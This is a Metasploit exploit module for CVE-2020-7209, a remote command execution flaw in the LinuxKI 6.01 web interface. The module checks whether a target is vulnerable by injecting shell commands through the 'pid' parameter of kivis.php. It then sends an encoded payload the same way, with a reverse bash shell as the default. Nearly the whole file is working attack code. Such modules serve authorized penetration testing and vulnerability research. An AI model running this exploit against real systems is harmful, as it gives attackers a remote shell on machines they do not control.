##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'LinuxKI 6.01 Remote Command Execution',
      'Description' => %q{
          This exploit is a remote code execution vulnerability in LinuxKI 6.01 and below.
		  The pid parameter received from the user is sent to the shell_exec function, resulting in security vulnerability.	
      },
      'License' => MSF_LICENSE,
      'Author'  =>
        [
          'Cody Winkler', # discovery and poc
          'numan turle'   # msf exploit
        ],
      'References' =>
        [
          ['EDB', '48483'],
          ['CVE', 'CVE-2020-7209'],
          ['PACKETSTORM', '157739'],
          ['URL', 'https://github.com/m0rph-1/CVE-2020-7209'],
          ['URL', 'https://owasp.org/www-community/attacks/Command_Injection'],
          ['URL', 'https://github.com/HewlettPackard/LinuxKI/commit/10bef483d92a85a13a59ca65a288818e92f80d78']
        ],
      'Privileged'   => false,
      'Payload'      =>
        {
          'DisableNops' => true,
          'Compat'      =>
           {
           'PayloadType' => 'cmd'
           }
        },
      'Platform'       => %w( linux unix ),
      'Arch'           => ARCH_CMD,
      'DefaultOptions' =>
       {
          'payload' => 'cmd/unix/reverse_bash',
       },
      'Targets'        => [ ['LinuxKI 6.01', { }], ],
      'DisclosureDate' => 'May 17 2020',
      'DefaultTarget'  => 0
    ))

    register_options([
     OptString.new('TARGETURI', [true, 'The path to the web application', '/linuxki/experimental/vis/']),
    ])
  end

  def check
    begin
    findstr = Rex::Text.rand_text_alphanumeric(10..15)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'kivis.php'),
      'vars_get' =>
        {
          'type' => 'kitrace',
          'pid' => "1;echo '#{findstr}';"
        }}
      )

    if res and res.code == 200 and res.body =~ /#{findstr}/
      return CheckCode::Vulnerable
    end

    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code == 404 or res.code == 403
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?

    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    CheckCode::Safe
  end

  def http_send_command(cmd)
    begin
    uri = normalize_uri(target_uri.path.to_s, "kivis.php")
    send_request_cgi({
      'method'   => 'GET',
      'uri'      =>  uri,
      'vars_get' =>
        {
          'type' => 'kitrace',
          'pid' => "1;"+cmd+";"
        }}
    )

    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end

  def exploit
    print_status("Sending exploit...")
    http_send_command(payload.encoded)
  end

end
